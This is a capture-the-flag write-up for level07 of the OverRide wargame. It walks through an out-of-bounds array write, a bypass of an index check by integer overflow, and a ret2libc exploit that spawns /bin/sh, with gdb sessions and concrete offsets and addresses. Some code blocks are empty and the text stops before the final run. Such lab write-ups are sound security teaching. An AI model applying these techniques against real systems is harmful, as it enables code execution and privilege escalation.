Let's start! Simple begining... open it with gdb  
Source code available [here](https://github.com/Nimpoo/override/blob/main/level07/source.c)  

```bash
level07@OverRide:~$ gdb level07

Okay, then run program and.. explore :

```bash

What happenend? I've been prompted for command with a mini-man (looks like a shell).  

The manual gives me three command:  
 - Store: I can store **any value** into the **data storage**
 - Read: I can read any **any value** from the **data storage**
 - Quit: Apparently just quit program by breaking the main loop

## What is this **"data storage"**?  

```c
unsigned char v6[400];
```

As you can see, the **data storage** is a simple bytes array with a size of 400.  
Considering it use `int` to store, and knowing that a `int` in 32bits take... ü•Åü•Åü•Å **32bits** !  
So, with `32 / 8 = 4` and `400 / 4 = 100`, we can deduce that the array is sized of 100 `int`s.

Only actions we can do are: `store`, `read`, `quit`.  
Ignoring `quit`, you know you can write and read with index starting from **data storage**.  
Don't care about capacity to read, but write in stack is cool.  
Some details remain.. Can I write everywhere ? Is the index verified before writing ? Is there a limit ?  

## Let's take a look to the `store` command

```c
int store_number(int *a1)
{
	unsigned int number, index;

	printf(" Number: ");
	number = get_unum();
	printf(" Index: ");
	index = get_unum();

	if (index == 3 * (index / 3) || HIBYTE(number) == 183) {
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	}

	else {
		a1[index] = number;
		return 0;
	}
}
```

Okay! When you split it you get:

```c
	unsigned int number, index;

	printf(" Number: ");
	number = get_unum();
	printf(" Index: ");
	index = get_unum();
```

It takes the number to store and an index,...  

```c
	if (index == 3 * (index / 3) || HIBYTE(number) == 183) {
		puts(" *** ERROR! ***");
		puts("   This index is reserved for wil!");
		puts(" *** ERROR! ***");
		return 1;
	}
```

...check if the index is a multiple of 3, else you are trying to write on reserved space (simple security than you can bypass using `int` overflow),...  

```c
	else {
		a1[index] = number;
		return 0;
	}
```

...and finaly write number if no error happenned.  

## Getting offset

I notice than `store_number` does not check if index is under 100 any time.  
Due to this problem, you can try to get offset from **data storage** to **return address** using **gdb**.  

When you store data, the **data storage** pointer is given to function as argument. Place a breakpoint on **store_number** or **read_number** and, when the function is called, you can read arguments from stack.  

```bash
Breakpoint 1, 0x08048729 in main ()
(gdb) print $ebp+4
$1 = (void *) 0xffffd71c
(gdb)
```

```bash
Breakpoint 2, 0x08048636 in store_number ()
(gdb) x/a $ebp+8
0xffffd530:	0xffffd554
(gdb)
```

First, I read address where the **retrun adress** of main is stored.  
Secondly, I read first argument of the **store_number** function.  
Then, substract them: `0xffffd71c - 0xffffd554 = 0x1c8 = 456`.  
Because of you are writting in `int`s, you have to divide by 4 (e.g. size of `int`), so offset is `114`.  

```bash
Input command: store
 Number: 42424242
 Index: 114
 *** ERROR! ***
   This index is reserved for wil!
 *** ERROR! ***
 Failed to do store command
Input command:
```

Apparently, `114` is a multiple of 3. Remember what I said on this weird security, you can easily bypass it using `int` overflow.  
`0xffffffff` is the maximum value that a 4-bytes `int` can store.  
Add 1 to enable **overflow** and add your wanted value in, `456`. It gives `0x1000001c8`. Divide it by 4 because of the code will multiply it back after, `0x40000072` or `1073741938`.  

## Ret2LibC

We did not take the time to think about which value to store as return address.

We will try to `ret2libc`, so we need to put `system` address and `/bin/sh` as argument.  

```bash
(gdb) print system
$3 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc map
process 1839
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile

(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"

```

Here, I got needed addresses, just convert it to decimal and system address become `4159090384` and `/bin/sh` address become `4160264172`.  

Let's try with all of theses new values:

```bash
level07@OverRide:~$ ./level07
